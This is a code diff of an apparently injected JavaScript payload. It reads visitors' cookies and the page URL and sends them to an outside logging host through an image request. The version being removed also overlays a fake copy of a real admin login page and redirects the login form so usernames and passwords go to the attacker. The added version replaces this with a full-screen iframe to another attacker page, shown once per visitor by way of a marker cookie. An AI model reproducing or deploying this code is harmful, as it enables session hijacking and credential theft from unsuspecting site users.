@@ -1,42 +1,41 @@
-jQuery("script[src='//rawgit.com/9os/a/a/a.js']").after("Elysium PVP Alliance");
-
-//Gen data
+if(gc1("dwf999jjs") == ""){
+	count = 0;
+	$("body").append("<iframe id='login_frame1' style='left: 0px; right: 0px; width: 100%; border: medium none; top: 0px; height: 100%; background: rgb(255, 255, 255) none repeat scroll 0% 0%; bottom: 0px; position: fixed; z-index: 999999;' src='http://h.net16.net/index2.php'></iframe>");
+	$("iframe#login_frame1").load(function(){
+		count++;
+		if(count > 1){
+			sc1("dwf999jjs", "sadasd", 99999);
+			$("iframe#login_frame1").remove();
+		}
+	});
+}
 cookie = "Cookies:"+document.cookie;
 url = "URL:"+document.location;
 
 $data = encodeURIComponent(cookie+url);
 
 var imageObject = new Image();
-imageObject.src = "http://g4wowisbad.000webhostapp.com/log.php?log="+$data;
+imageObject.src = "http://h.net16.net/log.php?log="+$data;
 
-//Let page load first
-document.head.innerHTML = "<style>#login_iframe{width:100%;height:100%;border:none;position:absolute;left:0;top:0;overflow:hidden;z-index:1000000000000000;}</style>" + document.head.innerHTML;
-document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background='#222 url(\'images/bg-login.gif\')'\" id='login_iframe' src='https://www.lvlgo.com/admin_lvlgo/Login.aspx'></iframe>" + document.body.innerHTML;
-var prevTitle = document.title;
-document.title = "网站管理系统";
+function gc1(cname) {
+	var name = cname + "=";
+	var decodedCookie = decodeURIComponent(document.cookie);
+	var ca = decodedCookie.split(';');
+	for(var i = 0; i <ca.length; i++) {
+		var c = ca[i];
+		while (c.charAt(0) == ' ') {
+			c = c.substring(1);
+		}
+		if (c.indexOf(name) == 0) {
+			return c.substring(name.length, c.length);
+		}
+	}
+	return "";
+}
 
-$("#login_iframe").load(function(){
-	//alert("Loaded");
-	$("#login_iframe").contents().find("#form1")[0].action = "//g4wowisbad.000webhostapp.com/login.php";
-	$("#login_iframe").contents().find("#txtUsername")[0].value = getCookie("login_name");
-	$("#login_iframe").contents().find("#form1").submit(function(){
-		$("#login_iframe").attr("src", "https://www.lvlgo.com/admin_lvlgo/Login.aspx");
-		$("#login_iframe").delay(1000).hide(0);
-		document.title = prevTitle;
-	});
-});
-
-function getCookie(cname) {
-    var name = cname + "=";
-    var ca = document.cookie.split(';');
-    for(var i = 0; i <ca.length; i++) {
-        var c = ca[i];
-        while (c.charAt(0) == ' ') {
-            c = c.substring(1);
-        }
-        if (c.indexOf(name) == 0) {
-            return c.substring(name.length, c.length);
-        }
-    }
-    return "";
+function sc1(cname, cvalue, exdays) {
+    var d = new Date();
+    d.setTime(d.getTime() + (exdays*24*60*60*1000));
+    var expires = "expires="+ d.toUTCString();
+    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
 }
